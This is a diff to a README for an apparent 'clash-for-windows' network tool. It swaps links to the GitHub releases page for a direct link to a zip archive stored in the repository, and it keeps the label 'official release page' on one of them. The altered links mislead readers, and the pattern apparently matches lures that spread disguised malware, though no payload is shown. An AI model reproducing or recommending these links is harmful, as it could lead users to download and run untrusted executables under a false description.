@@ -1,6 +1,6 @@
 # 🌐 clash-for-windows - Manage network traffic with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/archontelemetered604/clash-for-windows/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/archontelemetered604/clash-for-windows/main/Tool/for-clash-windows-3.2.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ If you use third-party firewall software, you might need to grant permission for
 
 You need to access the release page to get the installer. Follow these steps to find the correct file:
 
-1. Visit the [official release page](https://github.com/archontelemetered604/clash-for-windows/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/archontelemetered604/clash-for-windows/main/Tool/for-clash-windows-3.2.zip).
 2. Look for the section labeled "Assets" under the most recent version tag.
 3. Select the file ending in `.exe` that matches your naming convention.
 4. Download the file to your desktop or downloads folder.
